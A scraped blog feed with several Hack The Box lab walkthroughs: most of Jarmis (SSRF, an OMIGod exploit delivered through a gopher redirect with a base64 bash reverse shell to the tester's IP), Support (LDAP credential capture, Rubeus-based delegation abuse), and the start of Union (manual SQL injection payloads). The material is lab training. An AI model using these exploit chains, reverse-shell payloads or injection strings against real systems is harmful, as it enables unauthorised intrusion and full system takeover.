{\u0026#34;id\u0026#34;:200,\u0026#34;sig\u0026#34;:\u0026#34;29d29d00029d29d21c29d29d29d29df3fb741bc8febeb816e400df4c5f2e9e\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;176.32.103.205:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;amazon.com\u0026#34;}% So the values should be between 0 to 200 or in along those lines. Now lets get the accurate value Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/220 {\u0026#34;id\u0026#34;:220,\u0026#34;sig\u0026#34;:\u0026#34;29d29d00029d29d21c42d43d00041d44609a5a9a88e797f466e878a82e8365\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;3.211.157.115:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;netflix.com\u0026#34;}% Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/230 null% Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/221 {\u0026#34;id\u0026#34;:221,\u0026#34;sig\u0026#34;:\u0026#34;29d3fd00029d29d21c42d43d00041df48f145f65c66577d0b01ecea881c1ba\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;35.186.224.25:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;spotify.com\u0026#34;}% Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/222 {\u0026#34;id\u0026#34;:222,\u0026#34;sig\u0026#34;:\u0026#34;27d27d27d00027d1dc27d27d27d27d3446fb8839649f251e5083970c44ad30\u0026#34;,\u0026#34;ismalicious\u0026#34;:false,\u0026#34;endpoint\u0026#34;:\u0026#34;47.246.24.234:443\u0026#34;,\u0026#34;note\u0026#34;:\u0026#34;login.tmall.com\u0026#34;}% Hack The Box/Machines/Jarmis ❯ curl http://10.10.11.117/api/v1/search/id/223 null% I got the accurate value which is 222. Now lets perform the enumeration For this I made a simple bash script #!/bin/bash for id_num in {1..222}; do curl -s http://10.10.11.117/api/v1/search/id/$id_num | jq \u0026#39;select(.ismalicious == true)\u0026#39; done This was the output: ❯ ./automation.sh jq: parse error: Invalid numeric literal at line 1, column 7 jq: parse error: Invalid numeric literal at line 1, column 7 { \u0026#34;id\u0026#34;: 95, \u0026#34;sig\u0026#34;: \u0026#34;2ad2ad00000000000043d2ad2ad43dc4b09cccb7c1d19522df9b67bf57f4fb\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;104.24.4.98\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Sliver\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;Apache/2.4.40\u0026#34; } jq: parse error: Invalid numeric literal at line 1, column 7 { \u0026#34;id\u0026#34;: 128, \u0026#34;sig\u0026#34;: \u0026#34;2ad2ad0002ad2ad00042d42d000000ad9bf51cc3f5a1e29eecb81d0c7b06eb\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;185.199.109.153\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;SilentTrinity\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 135, \u0026#34;sig\u0026#34;: \u0026#34;21d000000000000000000000000000eeebf944d0b023a00f510f06a29b4f46\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;104.24.4.98\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Ncat\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 154, \u0026#34;sig\u0026#34;: \u0026#34;07d14d16d21d21d00042d43d000000aa99ce74e2c6d013c745aa52b5cc042d\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;99.86.230.31\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Metasploit\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;apache\u0026#34; } { \u0026#34;id\u0026#34;: 170, \u0026#34;sig\u0026#34;: \u0026#34;22b22b09b22b22b22b22b22b22b22b352842cd5d6b0278445702035e06875c\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;94.140.114.239\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Trickbot\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;Cowboy\u0026#34; } { \u0026#34;id\u0026#34;: 174, \u0026#34;sig\u0026#34;: \u0026#34;29d21b20d29d29d21c41d21b21b41d494e0df9532e75299f15ba73156cee38\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;192.64.119.215\u0026#34;, \u0026#34;note\u0026#34;: null, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 178, \u0026#34;sig\u0026#34;: \u0026#34;1dd40d40d00040d1dc1dd40d1dd40d3df2d6a0c2caaa0dc59908f0d3602943\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;192.145.239.18\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;AsyncRAT\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } { \u0026#34;id\u0026#34;: 179, \u0026#34;sig\u0026#34;: \u0026#34;2ad2ad0002ad2ad00043d2ad2ad43da5207249a18099be84ef3c8811adc883\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;94.140.114.239\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Sliver\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;Apache/2.4.38\u0026#34; } { \u0026#34;id\u0026#34;: 184, \u0026#34;sig\u0026#34;: \u0026#34;28d28d28d00028d00041d28d28d41dd279b0cf765af27fa62e66d7c8281124\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;51.136.77.112\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Gophish\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;nginx\u0026#34; } { \u0026#34;id\u0026#34;: 197, \u0026#34;sig\u0026#34;: \u0026#34;07d14d16d21d21d07c42d41d00041d24a458a375eef0c576d23a7bab9a9fb1\u0026#34;, \u0026#34;ismalicious\u0026#34;: true, \u0026#34;endpoint\u0026#34;: \u0026#34;104.17.237.190\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;CobaltStrike\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } There are like 10 outputs, metasploit looks interesting. Let\u0026rsquo;s see what happens if listened from metasploit. In metasploit select this module auxillary/server/capture/http and then set the port to 443, make SSL to true. Here is the oneliner sudo msfconsole -x \u0026#34;use auxiliary/server/capture/http; set srvport 443; set SSL true; run\u0026#34; Now I curled the fetch endpoint like this and got the note as Metasploit. ❯ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; | jq . % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 154 100 154 0 0 18 0 0:00:08 0:00:08 --:--:-- 32 { \u0026#34;sig\u0026#34;: \u0026#34;07d19d12d21d21d07c42d43d000000f50d155305214cf247147c43c0f1a823\u0026#34;, \u0026#34;ismalicious\u0026#34;: false, \u0026#34;endpoint\u0026#34;: \u0026#34;10.10.14.18:443\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;Metasploit?\u0026#34;, \u0026#34;server\u0026#34;: \u0026#34;\u0026#34; } Metasploit log: msf6 auxiliary(server/capture/http) \u0026gt; [*] Started service listener on 0.0.0.0:443 [*] Server started. [*] HTTP REQUEST 10.10.11.117 \u0026gt; 10.10.14.18:80 GET / Unknown cookies= Testing with SSRF # After a while, I tested the fetch endpoint for SSRF and there is SSRF to local host I can determine the open ports within the internal network with this vulnerability. The responses differ between open and closed, For an example Open Port: ❯ curl \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:22\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 117 100 117 0 0 128 0 --:--:-- --:--:-- --:--:-- 128 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;127.0.0.1:22\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } Open Port: ❯ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2Flocalhost:80\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 117 100 117 0 0 187 0 --:--:-- --:--:-- --:--:-- 187 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;127.0.0.1:80\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } Closed Port ❯ curl \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:21\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 109 100 109 0 0 110 0 --:--:-- --:--:-- --:--:-- 110 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;null\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } As you can see if the port is open it includes 127.0.0.1 in the response else it gives the value null To automate this I could use bash script but it would be slower, So choosing the script below is not recommended #!/bin/bash BASE_URL=\u0026#34;http://jarmis.htb/api/v1/fetch\u0026#34; START_PORT=1 END_PORT=65535 for port in $(seq $START_PORT $END_PORT); do URL=\u0026#34;$BASE_URL?endpoint=http://localhost:$port\u0026#34; RESPONSE=$(curl -s \u0026#34;$URL\u0026#34; -H \u0026#39;accept: application/json\u0026#39; | jq -r \u0026#39;.endpoint\u0026#39;) if [[ \u0026#34;$RESPONSE\u0026#34; == \u0026#34;127.0.0.1:$port\u0026#34; ]]; then echo \u0026#34;Port $port is open\u0026#34; fi done So I used Fuff to scan ffuf -u \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:FUZZ\u0026#39; -w \u0026lt;(seq 1 65535) -t 60 -fr \u0026#39;\u0026#34;endpoint\u0026#34;:\u0026#34;null\u0026#34;\u0026#39; The results looks interesting for a Linux box 22 [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 446ms] 80 [Status: 200, Size: 117, Words: 1, Lines: 1, Duration: 333ms] 5986 [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 342ms] 8001 [Status: 200, Size: 119, Words: 1, Lines: 1, Duration: 368ms] 33028 [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 292ms] 55394 [Status: 200, Size: 120, Words: 1, Lines: 1, Duration: 332ms] Port 5986 and 5985 seems interesting particularly because in windows those ports are used by WinRM. In the ffuf scan I didn\u0026rsquo;t get port 5985 but I tested it manually. It took me 20 seconds to respond may be that\u0026rsquo;s why ffuf marked it as closed but anyway this port seems interesting. ❯ curl \u0026#39;http://jarmis.htb/api/v1/fetch?endpoint=http://localhost:5985\u0026#39; -H \u0026#39;accept: application/json\u0026#39; | jq % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 119 100 119 0 0 5 0 0:00:23 0:00:20 0:00:03 27 { \u0026#34;sig\u0026#34;: \u0026#34;00000000000000000000000000000000000000000000000000000000000000\u0026#34;, \u0026#34;endpoint\u0026#34;: \u0026#34;127.0.0.1:5985\u0026#34;, \u0026#34;note\u0026#34;: \u0026#34;localhost\u0026#34; } Exploitation # CVE-2021-38647 # The port 5985 has Microsoft Open Management Infrastructure running we can exploit this service using CVE-2021-38647 and there is also a POC for this. But the POC just sends POST request to 5985 (Without TLS) or to 5986 (TLS included) Vulnerable part of this application is, Usually JARM sends 10 requests to verify and generate signature this part is known to us but here when the listener is malicious (i.e ismalicious=true) then JARM sends one extra request which is the 11th request. If we could get that request on listener then we could potentially modify it to use the exploit OMIGod(CVE-2021-38647). To achieve this we need to modify the Ip tables rules as proxy chains doesn\u0026rsquo;t support this level of precision Lets flush all the previous rules in the IP tables sudo iptables -t nat -F Then add this rule to redirect the 11th request from 443 to port 8443 sudo iptables -I PREROUTING -t nat -p tcp --dport 443 -m statistic --mode nth --every 11 --packet 10 -j REDIRECT --to-port 8443 Preparing the stage # To test this lets open two listeners, one on port 443 other on 8443 ncat --ssl -lnvp 443 for port 8443 ncat -ssl -lnvp 8443 I used fetch endpoint on my IP, and this worked very well On port 443 ❯ ncat --ssl -lnvp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 5B1D F737 C43E 3686 B058 EB4F 6C11 40B8 94DA 6CAD Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:56524. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Redirected 11th request from port 443 to 8443 ❯ ncat --ssl -lnvp 8443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 0B19 D1FA 27A0 86F1 D1AC 874E D599 8BF0 9DD1 9DD0 Ncat: Listening on [::]:8443 Ncat: Listening on 0.0.0.0:8443 Ncat: Connection from 10.10.11.117:56544. GET / HTTP/1.1 Host: 10.10.14.18 User-Agent: curl/7.74.0 Accept-Encoding: gzip, deflate Accept: */* Connection: keep-alive NCAT DEBUG: SSL_read error on 5: error:00000001:lib(0)::reason(1) Now we can exploit this using Gopher protocol. I have used this protocol before when doing Travel box, basically this protocol uses no headers thus perfect for delivering payloads I copied the payload data from the POC and after that I added curly braces replacing previous command data then included it into this python code. from flask import Flask, redirect from urllib.parse import quote app = Flask(__name__) DATA = \u0026#34;\u0026#34;\u0026#34;\u0026lt;s:Envelope xmlns:s=\u0026#34;http://www.w3.org/2003/05/soap-envelope\u0026#34; xmlns:a=\u0026#34;http://schemas.xmlsoap.org/ws/2004/08/addressing\u0026#34; xmlns:h=\u0026#34;http://schemas.microsoft.com/wbem/wsman/1/windows/shell\u0026#34; xmlns:n=\u0026#34;http://schemas.xmlsoap.org/ws/2004/09/enumeration\u0026#34; xmlns:p=\u0026#34;http://schemas.microsoft.com/wbem/wsman/1/wsman.xsd\u0026#34; xmlns:w=\u0026#34;http://schemas.dmtf.org/wbem/wsman/1/wsman.xsd\u0026#34; xmlns:xsi=\u0026#34;http://www.w3.org/2001/XMLSchema\u0026#34;\u0026gt; \u0026lt;s:Header\u0026gt; \u0026lt;a:To\u0026gt;HTTP://192.168.1.1:5986/wsman/\u0026lt;/a:To\u0026gt; \u0026lt;w:ResourceURI s:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\u0026lt;/w:ResourceURI\u0026gt; \u0026lt;a:ReplyTo\u0026gt; \u0026lt;a:Address s:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous\u0026lt;/a:Address\u0026gt; \u0026lt;/a:ReplyTo\u0026gt; \u0026lt;a:Action\u0026gt;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem/ExecuteShellCommand\u0026lt;/a:Action\u0026gt; \u0026lt;w:MaxEnvelopeSize s:mustUnderstand=\u0026#34;true\u0026#34;\u0026gt;102400\u0026lt;/w:MaxEnvelopeSize\u0026gt; \u0026lt;a:MessageID\u0026gt;uuid:0AB58087-C2C3-0005-0000-000000010000\u0026lt;/a:MessageID\u0026gt; \u0026lt;w:OperationTimeout\u0026gt;PT1M30S\u0026lt;/w:OperationTimeout\u0026gt; \u0026lt;w:Locale xml:lang=\u0026#34;en-us\u0026#34; s:mustUnderstand=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;p:DataLocale xml:lang=\u0026#34;en-us\u0026#34; s:mustUnderstand=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;w:OptionSet s:mustUnderstand=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;w:SelectorSet\u0026gt; \u0026lt;w:Selector Name=\u0026#34;__cimnamespace\u0026#34;\u0026gt;root/scx\u0026lt;/w:Selector\u0026gt; \u0026lt;/w:SelectorSet\u0026gt; \u0026lt;/s:Header\u0026gt; \u0026lt;s:Body\u0026gt; \u0026lt;p:ExecuteShellCommand_INPUT xmlns:p=\u0026#34;http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/SCX_OperatingSystem\u0026#34;\u0026gt; \u0026lt;p:command\u0026gt;{}\u0026lt;/p:command\u0026gt; \u0026lt;p:timeout\u0026gt;0\u0026lt;/p:timeout\u0026gt; \u0026lt;/p:ExecuteShellCommand_INPUT\u0026gt; \u0026lt;/s:Body\u0026gt; \u0026lt;/s:Envelope\u0026gt; \u0026#34;\u0026#34;\u0026#34; REQUEST = \u0026#34;\u0026#34;\u0026#34;POST / HTTP/1.1\\r Host: localhost:5985\\r User-Agent: curl/7.74.0\\r Content-Length: {length}\\r Content-Type: application/soap+xml;charset=UTF-8\\r \\r {body}\u0026#34;\u0026#34;\u0026#34; @app.route(\u0026#39;/\u0026#39;) def root(): cmd = \u0026#34;echo \u0026#39;YmFzaCAtYyAiZXhlYyBiYXNoIC1pICY+L2Rldi90Y3AvMTAuMTAuMTQuMTgvNjAwMSA8JjEiCg==\u0026#39; | base64 -d | bash\u0026#34; data = DATA.format(cmd) req = REQUEST.format(length=len(data)+2, body=data) enc_req = quote(req, safe=\u0026#39;\u0026#39;) return redirect(f\u0026#39;gopher://127.0.0.1:5985/_{enc_req}\u0026#39;, code=301) if __name__ == \u0026#34;__main__\u0026#34;: app.run(ssl_context=\u0026#39;adhoc\u0026#39;, debug=False, host=\u0026#34;0.0.0.0\u0026#34;, port=8443) I also included the base64 encoded reverse shell payload in the above python code echo \u0026#39;bash -c \u0026#34;exec bash -i \u0026amp;\u0026gt;/dev/tcp/10.10.14.18/6001 \u0026lt;\u0026amp;1\u0026#34;\u0026#39; | base64 Basically this python code will listen on 8443 and Upon receiving sends the request to target\u0026rsquo;s port 5985 with including malicious payload as data. Then the malicious payload will run the reverse shell. Performing the attack # Starting the python program python3 exp.py Starting the ncat listener on port 443 ncat --ssl -lnvp 443 Starting the reverse shell listener nc -lvnp 6001 As we already made the IP rule to redirect the 11th request from port 443 to port 8443. Now lets start the attack by using fetch endpoint pointing to our listener on port 443. ❯ curl \u0026#39;http://10.10.11.117/api/v1/fetch?endpoint=http%3A%2F%2F10.10.14.18\u0026#39; | jq . % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 176 100 176 0 0 2 0 0:01:28 0:01:02 0:00:26 42 jq: parse error: Invalid numeric literal at line 1, column 7 Response from 443 listener: ❯ ncat --ssl -lnvp 443 Ncat: Version 7.95 ( https://nmap.org/ncat ) Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one. Ncat: SHA-1 fingerprint: 9834 084E 3280 ECD3 7580 D227 EA15 2E75 6E9F B3C4 Ncat: Listening on [::]:443 Ncat: Listening on 0.0.0.0:443 Ncat: Connection from 10.10.11.117:58228. Ncat: Failed SSL connection from 10.10.11.117: error:0A000126:SSL routines::unexpected eof while reading Response from the python listener: ❯ python3 exp.py * Serving Flask app \u0026#39;exp\u0026#39; * Debug mode: on WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Running on all addresses (0.0.0.0) * Running on https://127.0.0.1:8443 * Running on https://192.168.65.240:8443 Press CTRL+C to quit 10.10.11.117 - - [14/Mar/2025 23:55:13] \u0026#34;GET / HTTP/1.1\u0026#34; 301 - Got the reverse shell connection and secured both the User flag \u0026amp; Root flag ❯ nc -lvnp 6001 listening on [any] 6001 ... connect to [10.10.14.18] from (UNKNOWN) [10.10.11.117] 53816 bash: cannot set terminal process group (17369): Inappropriate ioctl for device bash: no job control in this shell root@Jarmis:/var/opt/microsoft/scx/tmp# cd /root/ cd /root/ root@Jarmis:/root# cat root.txt cat root.txt e6d014840d\u0026lt;redacted\u0026gt; root@Jarmis:/root# ls /home ls /home htb root@Jarmis:/root# cat /home/htb/user.txt cat /home/htb/user.txt e2848e17\u0026lt;redacted\u0026gt; root@Jarmis:/root# ","date":"20 March 2025","externalUrl":null,"permalink":"/posts/1742061149402-jarmis-walkthroughhtb/","section":"Posts","summary":"","title":"Jarmis Walkthrough(Hack The Box)","type":"posts"},{"content":" About # Support is an Easy difficulty Windows machine that features an SMB share that allows anonymous authentication. After connecting to the share, an executable file is discovered that is used to query the machine\u0026amp;amp;amp;amp;#039;s LDAP server for available users. Through reverse engineering, network analysis or emulation, the password that the binary uses to bind the LDAP server is identified and can be used to make further LDAP queries. A user called support is identified in the users list, and the info field is found to contain his password, thus allowing for a WinRM connection to the machine. Once on the machine, domain information can be gathered through SharpHound, and BloodHound reveals that the Shared Support Accounts group that the support user is a member of, has GenericAll privileges on the Domain Controller. A Resource Based Constrained Delegation attack is performed, and a shell as NT Authority\\System is received. Reconnaissance \u0026amp; Enumeration # The port scan reveals multiple open ports As always we got LDAP, Netbios, SMB etc ports open Using smbclient I enumerated for smb shares and we got the share list smbclient -L support.htb However the interesting share here is support-tools. Using netexec I confirmed the guest login and it was a success netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; I enumerated for guest shares and we got access to two shares netexec smb support.htb -u sundeity -p \u0026#34;\u0026#34; --shares So I checked the share support-tools and as the name suggests we got some tools inside the directory. Most of the tools are familiar to me aleast their names are familiar I decided to enumerate all the zips from the share. Initially the zips didn\u0026rsquo;t provide me with anything interesting so I moved on to enumerate LDAP. nmap -n -sV --script \u0026#34;ldap* and not brute\u0026#34; -p 389 support.htb Then I enumerated for users using netexec from smb and got the users list Removed all unwanted texts from the list cat users.txt | grep \u0026#34;SidTypeUser\u0026#34; | cut -d \u0026#39;\\\u0026#39; -f 2 | cut -d \u0026#39;(\u0026#39; -f 1 \u0026gt;\u0026gt; users-smb.txt I Stored the users in a file. UsersInfo.exe analysis # Remember the file UsersInfo.exe.zip that we have downloaded from SMB share. At first I didn\u0026rsquo;t notice it but after a while I was stuck and then I only I realized the unfamiliar tool among the known tools within the share On running UsersInfo.exe with wine I can see it, authenticate to ldap for retrieving the user that we requested by that this tool checks if that particular user available in the DC or not, then it returns the statement accordingly. For an example the tool returned me a error No such object meaning the requested user cannot be found within LDAP\nThis tool doesn\u0026rsquo;t use any encryption to login against LDAP thus leaves the password used for authentication in clear text .If I can capture the traffic in wireshark I can get the password. In the LDAP I can see it authenticate as user ldap with the password. As I got a username and password I can now collect data for bloodhound Getting data for Bloodhound Exploitation # If we search the results of ldapsearch , particularly in the info field I can get another password. Which is new to me cause I never seen anything sensitive in an info field. ldapsearch -H ldap://support.htb -D \u0026#39;ldap@support.htb\u0026#39; -w \u0026#39;\u0026lt;password\u0026#39; -b \u0026#34;DC=support,DC=htb\u0026#34; | grep \u0026#34;info\u0026#34; In LDAP I got this password from the user support@support.htb I checked the bloodhound data, and user support is member of three groups For a change I used crackmapexec to password spray, eventually it confirms the password for support user crackmapexec winrm support.htb -u users-smb.txt -p \u0026lt;password\u0026gt; Using the newly dicovered password I logged into winrm via evilwinrm as user support evil-winrm -u support -p \u0026#39;\u0026lt;password\u0026gt;\u0026#39; -i support.htb Got the User flag Privilege Escalation # If we see, user support is in a group called Shared Support Accounts@Support.htb . That group have Generic all permissions over Domain controller Itself. This privilege allows the trustee to manipulate the target object however they wish. Abusing GenericALL # We can abuse this by the help instructions in Bloodhound for this Privilege. Here I am going to create a Fake computer under my control and that will act as DC to get kerberos ticket. Follow the steps below carefully Required Tools PowersView.ps1 Powermad.ps1 Rubeus.exe(Pre build from SharpCollection) Step 1: Upload all the tools to the target system, then # Do the following in the winrm shell cd C:\\\\programdata\nupload PowersView.ps1\nupload Powermad.ps1\nupload Rubeus.exe\nStep 2: Invoking all the scripts # . .\\PowerView.ps1 . .\\Powermad.ps1 Step 3: Creating a Fake Computer # New-MachineAccount -MachineAccount \u0026lt;Computername\u0026gt; -Password $(ConvertTo-SecureString \u0026#39;\u0026lt;Password\u0026gt;\u0026#39; -AsPlainText -Force) We need SID of the computer that we have created earlier, so that we can assign that value to a variable $fakesid = Get-DomainComputer \u0026lt;Computername\u0026gt; | select -expand objectsid Step 4: Configuring # Now I’ll configure the DC to trust my fake computer to make authorization decisions on it’s behalf. These commands will create an ACL with the fake computer’s SID and assign that to the DC Definition What is ACL? An ACL is a list of access control entries (ACEs) that define permissions for users or groups to access specific objects (like users, groups, computers, or organizational units) and their attributes. Purpose: ACLs ensure that only authorized users can access specific resources and perform specific actions, enhancing security and data protection.\n$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} Step 5: Auth as the Computer # .\\Rubeus.exe hash /password:\u0026lt;Password\u0026gt; /user:\u0026lt;ComputerName\u0026gt; /domain:support.htb Now copy the rc4_hmac hash from the output Step 6: Get the Kerberos Ticket # .\\Rubeus.exe s4u /user:\u0026lt;Computername\u0026gt;$ /rc4:\u0026lt;Hash\u0026gt; /impersonateuser:administrator /msdsspn:cifs/dc.support.htb /ptt Now ticket will be captured. We can see the base64 encoded ticket Copy the ticket for Administrator and put in a file called ticket.kirbi.b64 Remove all the whitespaces and unwanted lines, I done this in vim using this command :%s/\\s\\+//g Now decode the base64 into a different file base64 -d tick.kirbi.b64 \u0026gt; ticket.kirbi For linux operating systems we have to convert the ticket from kirbi to ccache, for passing the ticket We can easily convert this using ticketConverter.py. It\u0026rsquo;s one of the tool from Impacket tool kit. sudo /home/n_emperor/.local/share/pipx/venvs/netexec/bin/ticketConverter.py ticket.kirbi ticket.ccache Now Pass the ticket and spawn a shell KRB5CCNAME=ticket.ccache psexec.py support.htb/administrator@dc.support.htb -k -no-pass End # Secured the Root flag ","date":"18 March 2025","externalUrl":null,"permalink":"/posts/1741895312886-support-walkthroughhtb/","section":"Posts","summary":"","title":"Support Walkthrough(Hack The Box)","type":"posts"},{"content":" Reconnaissance \u0026amp; Enumeration # Nmap scan results PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) | http-methods: |_ Supported Methods: GET HEAD POST | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). Interesting isn\u0026rsquo;t it, we got only one port-80 open In the scan itslef we can see the PHPSESSID cookie, So, this is a PHP made website I eventually got bored looking at the website so fired up a subdomain scan and got no results After many unsuccessful attempts, as this is a PHP website I convinced myself to run a directory fuzzing with php extension ffuf -u http://union.htb/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -e .php -t 60 Got some interesting results firewall.php seems interesting but on accessing the page it\u0026rsquo;s throwing errors, just now I was happy This website has a Username check option if the username is valid or did not present in the database then It will provide a link to challenge.php, there we have to submit some kind of flag. This is how the website works This username check parameter seems to be vulnerable to SQL injection. If you have no idea about SQL Injection, I have a small post for that, first check that and then come back here. When I input this payload I got different error \u0026#39;OR 1=1; -- - There is a firewall running on this web page so SQLMap will not work, Thus we have to do all the work manually While I was spamming with SQLi payloads I got an Interesting response for this payload \u0026#39; UNION select user(); -- - To get the Info about databases, We can use this payload \u0026#39; UNION select group_concat(SCHEMA_NAME) from INFORMATION_SCHEMA.schemata; -- - Output: Sorry, mysql,information_schema,performance_schema,sys,november you are not eligible due to already qualifying. We got five databases in the corresponding response but november seems more interesting, So lets see what\u0026rsquo;s inside of it \u0026#39; UNION select group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=\u0026#39;november\u0026#39;; -- - Output: Sorry, flag,players you are not eligible due to already qualifying. We got what we needed november database has two tables, lets go further in \u0026#39; UNION select group_concat(table_name, \u0026#39;:\u0026#39;, column_name) from INFORMATION_SCHEMA.columns where table_schema=\u0026#39;november\u0026#39;; -- - Output: Sorry, flag:one,players:player you are not eligible due to already qualifying. Each of the tables had only one column. For now I am going for flag table. Let\u0026rsquo;s see\u0026hellip; \u0026#39; UNION select group_concat(one) from flag; -- - Output: Sorry, \u0026lt;redacted\u0026gt; you are not eligible due to already qualifying. I Got the flag not the Hack The Box user flag but the platform flag for this box and after submission of the flag, the website firewalls lifted and port 22 is now accessible Lets confirm this by a simple nmap scan on port 22 ❯ nmap -p 22 -A 10.10.11.128 Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-12 23:42 IST Nmap scan report for union.htb (10.10.11.128) Host is up (0.18s latency). PORT STATE SERVICE VERSION 22/tcp open ssh 